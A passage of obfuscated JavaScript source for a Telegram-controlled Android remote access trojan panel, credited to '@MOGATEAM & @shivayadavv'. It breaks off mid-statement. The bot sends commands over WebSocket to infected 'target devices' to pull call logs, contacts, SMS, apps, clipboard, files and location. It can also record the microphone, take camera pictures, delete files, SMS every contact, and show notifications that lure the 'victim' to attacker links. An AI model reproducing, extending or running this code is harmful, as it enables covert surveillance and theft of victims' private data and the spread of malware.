        '\xB0\u2022 \uD835\uDE54\uD835\uDE64\uD835\uDE6A\uD835\uDE67 \uD835\uDE67\uD835\uDE5A\uD835\uDE66\uD835\uDE6A\uD835\uDE5A\uD835\uDE68\uD835\uDE69 \uD835\uDE5E\uD835\uDE68 \uD835\uDE64\uD835\uDE63 \uD835\uDE65\uD835\uDE67\uD835\uDE64\uD835\uDE58\uD835\uDE5A\uD835\uDE68\uD835\uDE68\n\n\u2022 ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ, DEVELOPED BY @MOGATEAM & @shivayadavv',
        {
          parse_mode: 'HTML',
          reply_markup: {
            keyboard: [
              [
                '\uD835\uDE3E\uD835\uDE64\uD835\uDE63\uD835\uDE63\uD835\uDE5A\uD835\uDE58\uD835\uDE69\uD835\uDE5A\uD835\uDE59 \uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A\uD835\uDE68',
              ],
              [
                '\uD835\uDE40\uD835\uDE6D\uD835\uDE5A\uD835\uDE58\uD835\uDE6A\uD835\uDE69\uD835\uDE5A \uD835\uDE58\uD835\uDE64\uD835\uDE62\uD835\uDE62\uD835\uDE56\uD835\uDE63\uD835\uDE59',
              ],
            ],
            resize_keyboard: true,
          },
        }
      )
    }
    if (
      _0x2ca88f.reply_to_message.text.includes(
        '\xB0\u2022 \uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE62\uD835\uDE5A\uD835\uDE68\uD835\uDE68\uD835\uDE56\uD835\uDE5C\uD835\uDE5A \uD835\uDE69\uD835\uDE5D\uD835\uDE56\uD835\uDE69 \uD835\uDE6E\uD835\uDE64\uD835\uDE6A \uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69 \uD835\uDE69\uD835\uDE64 \uD835\uDE56\uD835\uDE65\uD835\uDE65\uD835\uDE5A\uD835\uDE56\uD835\uDE67 \uD835\uDE56\uD835\uDE68 \uD835\uDE63\uD835\uDE64\uD835\uDE69\uD835\uDE5E\uD835\uDE5B\uD835\uDE5E\uD835\uDE58\uD835\uDE56\uD835\uDE69\uD835\uDE5E\uD835\uDE64\uD835\uDE63'
      )
    ) {
      const _0x531cc1 = _0x2ca88f.text
      currentTitle = _0x531cc1
      appBot.sendMessage(
        id,
        '\xB0\u2022 \uD835\uDE42\uD835\uDE67\uD835\uDE5A\uD835\uDE56\uD835\uDE69, \uD835\uDE63\uD835\uDE64\uD835\uDE6C \uD835\uDE5A\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE61\uD835\uDE5E\uD835\uDE63\uD835\uDE60 \uD835\uDE6E\uD835\uDE64\uD835\uDE6A \uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69 \uD835\uDE69\uD835\uDE64 \uD835\uDE57\uD835\uDE5A \uD835\uDE64\uD835\uDE65\uD835\uDE5A\uD835\uDE63\uD835\uDE5A\uD835\uDE59 \uD835\uDE57\uD835\uDE6E \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE63\uD835\uDE64\uD835\uDE69\uD835\uDE5E\uD835\uDE5B\uD835\uDE5E\uD835\uDE58\uD835\uDE56\uD835\uDE69\uD835\uDE5E\uD835\uDE64\uD835\uDE63\n\n\u2022 ᴡʜᴇɴ ᴛʜᴇ ᴠɪᴄᴛɪᴍ ᴄʟɪᴄᴋꜱ ᴏɴ ᴛʜᴇ ɴᴏᴛɪꜰɪᴄᴀᴛɪᴏɴ, ᴛʜᴇ ʟɪɴᴋ ʏᴏᴜ ᴀʀᴇ ᴇɴᴛᴇʀɪɴɢ ᴡɪʟʟ ʙᴇ ᴏᴘᴇɴᴇᴅ',
        { reply_markup: { force_reply: true } }
      )
    }
    if (
      _0x2ca88f.reply_to_message.text.includes(
        '\xB0\u2022 \uD835\uDE42\uD835\uDE67\uD835\uDE5A\uD835\uDE56\uD835\uDE69, \uD835\uDE63\uD835\uDE64\uD835\uDE6C \uD835\uDE5A\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE61\uD835\uDE5E\uD835\uDE63\uD835\uDE60 \uD835\uDE6E\uD835\uDE64\uD835\uDE6A \uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69 \uD835\uDE69\uD835\uDE64 \uD835\uDE57\uD835\uDE5A \uD835\uDE64\uD835\uDE65\uD835\uDE5A\uD835\uDE63\uD835\uDE5A\uD835\uDE59 \uD835\uDE57\uD835\uDE6E \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE63\uD835\uDE64\uD835\uDE69\uD835\uDE5E\uD835\uDE5B\uD835\uDE5E\uD835\uDE58\uD835\uDE56\uD835\uDE69\uD835\uDE5E\uD835\uDE64\uD835\uDE63'
      )
    ) {
      const _0x4c37b7 = _0x2ca88f.text
      appSocket.clients.forEach(function _0x19b737(_0x13f3d9) {
        _0x13f3d9.uuid == currentUuid &&
          _0x13f3d9.send('show_notification:' + currentTitle + '/' + _0x4c37b7)
      })
      currentUuid = ''
      appBot.sendMessage(
        id,
        '\xB0\u2022 \uD835\uDE54\uD835\uDE64\uD835\uDE6A\uD835\uDE67 \uD835\uDE67\uD835\uDE5A\uD835\uDE66\uD835\uDE6A\uD835\uDE5A\uD835\uDE68\uD835\uDE69 \uD835\uDE5E\uD835\uDE68 \uD835\uDE64\uD835\uDE63 \uD835\uDE65\uD835\uDE67\uD835\uDE64\uD835\uDE58\uD835\uDE5A\uD835\uDE68\uD835\uDE68\n\n\u2022 ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ, DEVELOPED BY @MOGATEAM & @shivayadavv',
        {
          parse_mode: 'HTML',
          reply_markup: {
            keyboard: [
              [
                '\uD835\uDE3E\uD835\uDE64\uD835\uDE63\uD835\uDE63\uD835\uDE5A\uD835\uDE58\uD835\uDE69\uD835\uDE5A\uD835\uDE59 \uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A\uD835\uDE68',
              ],
              [
                '\uD835\uDE40\uD835\uDE6D\uD835\uDE5A\uD835\uDE58\uD835\uDE6A\uD835\uDE69\uD835\uDE5A \uD835\uDE58\uD835\uDE64\uD835\uDE62\uD835\uDE62\uD835\uDE56\uD835\uDE63\uD835\uDE59',
              ],
            ],
            resize_keyboard: true,
          },
        }
      )
    }
    if (
      _0x2ca88f.reply_to_message.text.includes(
        '\xB0\u2022 \uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE56\uD835\uDE6A\uD835\uDE59\uD835\uDE5E\uD835\uDE64 \uD835\uDE61\uD835\uDE5E\uD835\uDE63\uD835\uDE60 \uD835\uDE6E\uD835\uDE64\uD835\uDE6A \uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69 \uD835\uDE69\uD835\uDE64 \uD835\uDE65\uD835\uDE61\uD835\uDE56\uD835\uDE6E'
      )
    ) {
      const _0x224ab9 = _0x2ca88f.text
      appSocket.clients.forEach(function _0x8427d7(_0x3d44ae) {
        _0x3d44ae.uuid == currentUuid &&
          _0x3d44ae.send('play_audio:' + _0x224ab9)
      })
      currentUuid = ''
      appBot.sendMessage(
        id,
        '\xB0\u2022 \uD835\uDE54\uD835\uDE64\uD835\uDE6A\uD835\uDE67 \uD835\uDE67\uD835\uDE5A\uD835\uDE66\uD835\uDE6A\uD835\uDE5A\uD835\uDE68\uD835\uDE69 \uD835\uDE5E\uD835\uDE68 \uD835\uDE64\uD835\uDE63 \uD835\uDE65\uD835\uDE67\uD835\uDE64\uD835\uDE58\uD835\uDE5A\uD835\uDE68\uD835\uDE68\n\n\u2022 ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ, DEVELOPED BY @MOGATEAM & @shivayadavv',
        {
          parse_mode: 'HTML',
          reply_markup: {
            keyboard: [
              [
                '\uD835\uDE3E\uD835\uDE64\uD835\uDE63\uD835\uDE63\uD835\uDE5A\uD835\uDE58\uD835\uDE69\uD835\uDE5A\uD835\uDE59 \uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A\uD835\uDE68',
              ],
              [
                '\uD835\uDE40\uD835\uDE6D\uD835\uDE5A\uD835\uDE58\uD835\uDE6A\uD835\uDE69\uD835\uDE5A \uD835\uDE58\uD835\uDE64\uD835\uDE62\uD835\uDE62\uD835\uDE56\uD835\uDE63\uD835\uDE59',
              ],
            ],
            resize_keyboard: true,
          },
        }
      )
    }
  }
  if (id == _0x32d1ff) {
    _0x2ca88f.text == '/start' &&
      appBot.sendMessage(
        id,
        '\xB0\u2022 \xB0\u2022 \uD835\uDE52\uD835\uDE5A\uD835\uDE61\uD835\uDE58\uD835\uDE64\uD835\uDE62\uD835\uDE5A \uD835\uDE69\uD835\uDE64  Fuse\uD835\uDE4D\uD835\uDE56\uD835\uDE69 \uD835\uDE65\uD835\uDE56\uD835\uDE63\uD835\uDE5A\uD835\uDE61\n\n\u2022 ɪꜰ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪꜱ ɪɴꜱᴛᴀʟʟᴇᴅ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ, ᴡᴀɪᴛ ꜰᴏʀ ᴛʜᴇ ᴄᴏɴɴᴇᴄᴛɪᴏɴ\n\n\u2022 ᴡʜᴇɴ ʏᴏᴜ ʀᴇᴄᴇɪᴠᴇ ᴛʜᴇ ᴄᴏɴɴᴇᴄᴛɪᴏɴ ᴍᴇꜱꜱᴀɢᴇ, ɪᴛ ᴍᴇᴀɴꜱ ᴛʜᴀᴛ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ ɪꜱ ᴄᴏɴɴᴇᴄᴛᴇᴅ ᴀɴᴅ ʀᴇᴀᴅʏ ᴛᴏ ʀᴇᴄᴇɪᴠᴇ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅ\n\n\u2022 ᴄʟɪᴄᴋ ᴏɴ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅ ʙᴜᴛᴛᴏɴ ᴀɴᴅ ꜱᴇʟᴇᴄᴛ ᴛʜᴇ ᴅᴇꜱɪʀᴇᴅ ᴅᴇᴠɪᴄᴇ ᴛʜᴇɴ ꜱᴇʟᴇᴄᴛ ᴛʜᴇ ᴅᴇꜱɪʀᴇᴅ ᴄᴏᴍᴍᴀɴᴅ ᴀᴍᴏɴɢ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅꜱ\n\n\u2022 ɪꜰ ʏᴏᴜ ɢᴇᴛ ꜱᴛᴜᴄᴋ ꜱᴏᴍᴇᴡʜᴇʀᴇ ɪɴ ᴛʜᴇ ʙᴏᴛ, ꜱᴇɴᴅ /start ᴄᴏᴍᴍᴀɴᴅ',
        {
          parse_mode: 'HTML',
          reply_markup: {
            keyboard: [
              [
                '\uD835\uDE3E\uD835\uDE64\uD835\uDE63\uD835\uDE63\uD835\uDE5A\uD835\uDE58\uD835\uDE69\uD835\uDE5A\uD835\uDE59 \uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A\uD835\uDE68',
              ],
              [
                '\uD835\uDE40\uD835\uDE6D\uD835\uDE5A\uD835\uDE58\uD835\uDE6A\uD835\uDE69\uD835\uDE5A \uD835\uDE58\uD835\uDE64\uD835\uDE62\uD835\uDE62\uD835\uDE56\uD835\uDE63\uD835\uDE59',
              ],
            ],
            resize_keyboard: true,
          },
        }
      )
    if (
      _0x2ca88f.text ==
      '\uD835\uDE3E\uD835\uDE64\uD835\uDE63\uD835\uDE63\uD835\uDE5A\uD835\uDE58\uD835\uDE69\uD835\uDE5A\uD835\uDE59 \uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A\uD835\uDE68'
    ) {
      if (appClients.size == 0) {
        appBot.sendMessage(
          id,
          '\xB0\u2022 \uD835\uDE49\uD835\uDE64 \uD835\uDE58\uD835\uDE64\uD835\uDE63\uD835\uDE63\uD835\uDE5A\uD835\uDE58\uD835\uDE69\uD835\uDE5E\uD835\uDE63\uD835\uDE5C \uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A\uD835\uDE68 \uD835\uDE56\uD835\uDE6B\uD835\uDE56\uD835\uDE5E\uD835\uDE61\uD835\uDE56\uD835\uDE57\uD835\uDE61\uD835\uDE5A\n\n\u2022 ᴍᴀᴋᴇ ꜱᴜʀᴇ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪꜱ ɪɴꜱᴛᴀʟʟᴇᴅ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ'
        )
      } else {
        let _0x31005f =
          '\xB0\u2022 \uD835\uDE47\uD835\uDE5E\uD835\uDE68\uD835\uDE69 \uD835\uDE64\uD835\uDE5B \uD835\uDE58\uD835\uDE64\uD835\uDE63\uD835\uDE63\uD835\uDE5A\uD835\uDE58\uD835\uDE69\uD835\uDE5A\uD835\uDE59 \uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A\uD835\uDE68 :\n\n'
        appClients.forEach(function (_0x3c015b, _0x268f1c, _0x27c205) {
          _0x31005f +=
            '\u2022 ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>' +
            _0x3c015b.model +
            '</b>\n' +
            ('\u2022 ʙᴀᴛᴛᴇʀʏ : <b>' + _0x3c015b.battery + '</b>\n') +
            ('\u2022 ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>' + _0x3c015b.version + '</b>\n') +
            ('\u2022 ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>' +
              _0x3c015b.brightness +
              '</b>\n') +
            ('\u2022 ᴘʀᴏᴠɪᴅᴇʀ : <b>' + _0x3c015b.provider + '</b>\n\n')
        })
        appBot.sendMessage(id, _0x31005f, { parse_mode: 'HTML' })
      }
    }
    if (
      _0x2ca88f.text ==
      '\uD835\uDE40\uD835\uDE6D\uD835\uDE5A\uD835\uDE58\uD835\uDE6A\uD835\uDE69\uD835\uDE5A \uD835\uDE58\uD835\uDE64\uD835\uDE62\uD835\uDE62\uD835\uDE56\uD835\uDE63\uD835\uDE59'
    ) {
      if (appClients.size == 0) {
        appBot.sendMessage(
          id,
          '\xB0\u2022 \uD835\uDE49\uD835\uDE64 \uD835\uDE58\uD835\uDE64\uD835\uDE63\uD835\uDE63\uD835\uDE5A\uD835\uDE58\uD835\uDE69\uD835\uDE5E\uD835\uDE63\uD835\uDE5C \uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A\uD835\uDE68 \uD835\uDE56\uD835\uDE6B\uD835\uDE56\uD835\uDE5E\uD835\uDE61\uD835\uDE56\uD835\uDE57\uD835\uDE61\uD835\uDE5A\n\n\u2022 ᴍᴀᴋᴇ ꜱᴜʀᴇ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪꜱ ɪɴꜱᴛᴀʟʟᴇᴅ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ'
        )
      } else {
        const _0x118a77 = []
        appClients.forEach(function (_0x4ed698, _0x52dcb4, _0x3ca3bb) {
          _0x118a77.push([
            {
              text: _0x4ed698.model,
              callback_data: 'device:' + _0x52dcb4,
            },
          ])
        })
        appBot.sendMessage(
          id,
          '\xB0\u2022 \uD835\uDE4E\uD835\uDE5A\uD835\uDE61\uD835\uDE5A\uD835\uDE58\uD835\uDE69 \uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A \uD835\uDE69\uD835\uDE64 \uD835\uDE5A\uD835\uDE6D\uD835\uDE5A\uD835\uDE58\uD835\uDE6A\uD835\uDE69\uD835\uDE5A \uD835\uDE58\uD835\uDE64\uD835\uDE62\uD835\uDE62\uD835\uDE5A\uD835\uDE63\uD835\uDE59',
          { reply_markup: { inline_keyboard: _0x118a77 } }
        )
      }
    }
  } else {
    appBot.sendMessage(
      id,
      '\xB0\u2022 \uD835\uDE4B\uD835\uDE5A\uD835\uDE67\uD835\uDE62\uD835\uDE5E\uD835\uDE68\uD835\uDE68\uD835\uDE5E\uD835\uDE64\uD835\uDE63 \uD835\uDE59\uD835\uDE5A\uD835\uDE63\uD835\uDE5E\uD835\uDE5A\uD835\uDE59'
    )
  }
})

appBot.on('callback_query', (_0x425827) => {
  const _0x440ba5 = _0x425827.message,
    _0x9f09ec = _0x425827.data,
    _0x2f3f8b = _0x9f09ec.split(':')[0],
    _0x39894d = _0x9f09ec.split(':')[1]
  console.log(_0x39894d)
  _0x2f3f8b == 'device' &&
    appBot.editMessageText(
      '\xB0\u2022 \uD835\uDE4E\uD835\uDE5A\uD835\uDE61\uD835\uDE5A\uD835\uDE58\uD835\uDE69 \uD835\uDE58\uD835\uDE64\uD835\uDE62\uD835\uDE62\uD835\uDE5A\uD835\uDE63\uD835\uDE59 \uD835\uDE5B\uD835\uDE64\uD835\uDE67 \uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A : <b>' +
        appClients.get(_0x9f09ec.split(':')[1]).model +
        '</b>',
      {
        width: 10000,
        chat_id: id,
        message_id: _0x440ba5.message_id,
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: '\uD835\uDE3C\uD835\uDE65\uD835\uDE65\uD835\uDE68',
                callback_data: 'apps:' + _0x39894d,
              },
              {
                text: '\uD835\uDE3F\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A \uD835\uDE5E\uD835\uDE63\uD835\uDE5B\uD835\uDE64',
                callback_data: 'device_info:' + _0x39894d,
              },
            ],
            [
              {
                text: '\uD835\uDE42\uD835\uDE5A\uD835\uDE69 \uD835\uDE5B\uD835\uDE5E\uD835\uDE61\uD835\uDE5A',
                callback_data: 'file:' + _0x39894d,
              },
              {
                text: '\uD835\uDE3F\uD835\uDE5A\uD835\uDE61\uD835\uDE5A\uD835\uDE69\uD835\uDE5A \uD835\uDE5B\uD835\uDE5E\uD835\uDE61\uD835\uDE5A',
                callback_data: 'delete_file:' + _0x39894d,
              },
            ],
            [
              {
                text: '\uD835\uDE3E\uD835\uDE61\uD835\uDE5E\uD835\uDE65\uD835\uDE57\uD835\uDE64\uD835\uDE56\uD835\uDE67\uD835\uDE59',
                callback_data: 'clipboard:' + _0x39894d,
              },
              {
                text: '\uD835\uDE48\uD835\uDE5E\uD835\uDE58\uD835\uDE67\uD835\uDE64\uD835\uDE65\uD835\uDE5D\uD835\uDE64\uD835\uDE63\uD835\uDE5A',
                callback_data: 'microphone:' + _0x39894d,
              },
            ],
            [
              {
                text: '\uD835\uDE48\uD835\uDE56\uD835\uDE5E\uD835\uDE63 \uD835\uDE58\uD835\uDE56\uD835\uDE62\uD835\uDE5A\uD835\uDE67\uD835\uDE56',
                callback_data: 'camera_main:' + _0x39894d,
              },
              {
                text: '\uD835\uDE4E\uD835\uDE5A\uD835\uDE61\uD835\uDE5B\uD835\uDE5E\uD835\uDE5A \uD835\uDE58\uD835\uDE56\uD835\uDE62\uD835\uDE5A\uD835\uDE67\uD835\uDE56',
                callback_data: 'camera_selfie:' + _0x39894d,
              },
            ],
            [
              {
                text: '\uD835\uDE47\uD835\uDE64\uD835\uDE58\uD835\uDE56\uD835\uDE69\uD835\uDE5E\uD835\uDE64\uD835\uDE63',
                callback_data: 'location:' + _0x39894d,
              },
              {
                text: '\uD835\uDE4F\uD835\uDE64\uD835\uDE56\uD835\uDE68\uD835\uDE69',
                callback_data: 'toast:' + _0x39894d,
              },
            ],
            [
              {
                text: '\uD835\uDE3E\uD835\uDE56\uD835\uDE61\uD835\uDE61\uD835\uDE68',
                callback_data: 'calls:' + _0x39894d,
              },
              {
                text: '\uD835\uDE3E\uD835\uDE64\uD835\uDE63\uD835\uDE69\uD835\uDE56\uD835\uDE58\uD835\uDE69\uD835\uDE68',
                callback_data: 'contacts:' + _0x39894d,
              },
            ],
            [
              {
                text: '\uD835\uDE51\uD835\uDE5E\uD835\uDE57\uD835\uDE67\uD835\uDE56\uD835\uDE69\uD835\uDE5A',
                callback_data: 'vibrate:' + _0x39894d,
              },
              {
                text: '\uD835\uDE4E\uD835\uDE5D\uD835\uDE64\uD835\uDE6C \uD835\uDE63\uD835\uDE64\uD835\uDE69\uD835\uDE5E\uD835\uDE5B\uD835\uDE5E\uD835\uDE58\uD835\uDE56\uD835\uDE69\uD835\uDE5E\uD835\uDE64\uD835\uDE63',
                callback_data: 'show_notification:' + _0x39894d,
              },
            ],
            [
              {
                text: '\uD835\uDE48\uD835\uDE5A\uD835\uDE68\uD835\uDE68\uD835\uDE56\uD835\uDE5C\uD835\uDE5A\uD835\uDE68',
                callback_data: 'messages:' + _0x39894d,
              },
              {
                text: '\uD835\uDE4E\uD835\uDE5A\uD835\uDE63\uD835\uDE59 \uD835\uDE62\uD835\uDE5A\uD835\uDE68\uD835\uDE68\uD835\uDE56\uD835\uDE5C\uD835\uDE5A',
                callback_data: 'send_message:' + _0x39894d,
              },
            ],
            [
              {
                text: '\uD835\uDE4B\uD835\uDE61\uD835\uDE56\uD835\uDE6E \uD835\uDE56\uD835\uDE6A\uD835\uDE59\uD835\uDE5E\uD835\uDE64',
                callback_data: 'play_audio:' + _0x39894d,
              },
              {
                text: '\uD835\uDE4E\uD835\uDE69\uD835\uDE64\uD835\uDE65 \uD835\uDE56\uD835\uDE6A\uD835\uDE59\uD835\uDE5E\uD835\uDE64',
                callback_data: 'stop_audio:' + _0x39894d,
              },
            ],
            [
              {
                text: '\uD835\uDE4E\uD835\uDE5A\uD835\uDE63\uD835\uDE59 \uD835\uDE62\uD835\uDE5A\uD835\uDE68\uD835\uDE68\uD835\uDE56\uD835\uDE5C\uD835\uDE5A \uD835\uDE69\uD835\uDE64 \uD835\uDE56\uD835\uDE61\uD835\uDE61 \uD835\uDE58\uD835\uDE64\uD835\uDE63\uD835\uDE69\uD835\uDE56\uD835\uDE58\uD835\uDE69\uD835\uDE68',
                callback_data: 'send_message_to_all:' + _0x39894d,
              },
            ],
          ],
        },
        parse_mode: 'HTML',
      }
    )
  _0x2f3f8b == 'calls' &&
    (appSocket.clients.forEach(function _0x402e5d(_0x26e82d) {
      _0x26e82d.uuid == _0x39894d && _0x26e82d.send('calls')
    }),
    appBot.deleteMessage(id, _0x440ba5.message_id),
    appBot.sendMessage(
      id,
      '\xB0\u2022 \uD835\uDE54\uD835\uDE64\uD835\uDE6A\uD835\uDE67 \uD835\uDE67\uD835\uDE5A\uD835\uDE66\uD835\uDE6A\uD835\uDE5A\uD835\uDE68\uD835\uDE69 \uD835\uDE5E\uD835\uDE68 \uD835\uDE64\uD835\uDE63 \uD835\uDE65\uD835\uDE67\uD835\uDE64\uD835\uDE58\uD835\uDE5A\uD835\uDE68\uD835\uDE68\n\n\u2022 ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ, DEVELOPED BY @MOGATEAM & @shivayadavv',
      {
        parse_mode: 'HTML',
        reply_markup: {
          keyboard: [
            [
              '\uD835\uDE3E\uD835\uDE64\uD835\uDE63\uD835\uDE63\uD835\uDE5A\uD835\uDE58\uD835\uDE69\uD835\uDE5A\uD835\uDE59 \uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A\uD835\uDE68',
            ],
            [
              '\uD835\uDE40\uD835\uDE6D\uD835\uDE5A\uD835\uDE58\uD835\uDE6A\uD835\uDE69\uD835\uDE5A \uD835\uDE58\uD835\uDE64\uD835\uDE62\uD835\uDE62\uD835\uDE56\uD835\uDE63\uD835\uDE59',
            ],
          ],
          resize_keyboard: true,
        },
      }
    ))
  _0x2f3f8b == 'contacts' &&
    (appSocket.clients.forEach(function _0x2fa71f(_0x21d289) {
      _0x21d289.uuid == _0x39894d && _0x21d289.send('contacts')
    }),
    appBot.deleteMessage(id, _0x440ba5.message_id),
    appBot.sendMessage(
      id,
      '\xB0\u2022 \uD835\uDE54\uD835\uDE64\uD835\uDE6A\uD835\uDE67 \uD835\uDE67\uD835\uDE5A\uD835\uDE66\uD835\uDE6A\uD835\uDE5A\uD835\uDE68\uD835\uDE69 \uD835\uDE5E\uD835\uDE68 \uD835\uDE64\uD835\uDE63 \uD835\uDE65\uD835\uDE67\uD835\uDE64\uD835\uDE58\uD835\uDE5A\uD835\uDE68\uD835\uDE68\n\n\u2022 ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ, DEVELOPED BY @MOGATEAM & @shivayadavv',
      {
        parse_mode: 'HTML',
        reply_markup: {
          keyboard: [
            [
              '\uD835\uDE3E\uD835\uDE64\uD835\uDE63\uD835\uDE63\uD835\uDE5A\uD835\uDE58\uD835\uDE69\uD835\uDE5A\uD835\uDE59 \uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A\uD835\uDE68',
            ],
            [
              '\uD835\uDE40\uD835\uDE6D\uD835\uDE5A\uD835\uDE58\uD835\uDE6A\uD835\uDE69\uD835\uDE5A \uD835\uDE58\uD835\uDE64\uD835\uDE62\uD835\uDE62\uD835\uDE56\uD835\uDE63\uD835\uDE59',
            ],
          ],
          resize_keyboard: true,
        },
      }
    ))
  _0x2f3f8b == 'messages' &&
    (appSocket.clients.forEach(function _0x419732(_0x534e2c) {
      _0x534e2c.uuid == _0x39894d && _0x534e2c.send('messages')
    }),
    appBot.deleteMessage(id, _0x440ba5.message_id),
    appBot.sendMessage(
      id,
      '\xB0\u2022 \uD835\uDE54\uD835\uDE64\uD835\uDE6A\uD835\uDE67 \uD835\uDE67\uD835\uDE5A\uD835\uDE66\uD835\uDE6A\uD835\uDE5A\uD835\uDE68\uD835\uDE69 \uD835\uDE5E\uD835\uDE68 \uD835\uDE64\uD835\uDE63 \uD835\uDE65\uD835\uDE67\uD835\uDE64\uD835\uDE58\uD835\uDE5A\uD835\uDE68\uD835\uDE68\n\n\u2022 ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ, DEVELOPED BY @MOGATEAM & @shivayadavv',
      {
        parse_mode: 'HTML',
        reply_markup: {
          keyboard: [
            [
              '\uD835\uDE3E\uD835\uDE64\uD835\uDE63\uD835\uDE63\uD835\uDE5A\uD835\uDE58\uD835\uDE69\uD835\uDE5A\uD835\uDE59 \uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A\uD835\uDE68',
            ],
            [
              '\uD835\uDE40\uD835\uDE6D\uD835\uDE5A\uD835\uDE58\uD835\uDE6A\uD835\uDE69\uD835\uDE5A \uD835\uDE58\uD835\uDE64\uD835\uDE62\uD835\uDE62\uD835\uDE56\uD835\uDE63\uD835\uDE59',
            ],
          ],
          resize_keyboard: true,
        },
      }
    ))
  _0x2f3f8b == 'apps' &&
    (appSocket.clients.forEach(function _0x2dd3c0(_0x30b02f) {
      _0x30b02f.uuid == _0x39894d && _0x30b02f.send('apps')
    }),
    appBot.deleteMessage(id, _0x440ba5.message_id),
    appBot.sendMessage(
      id,
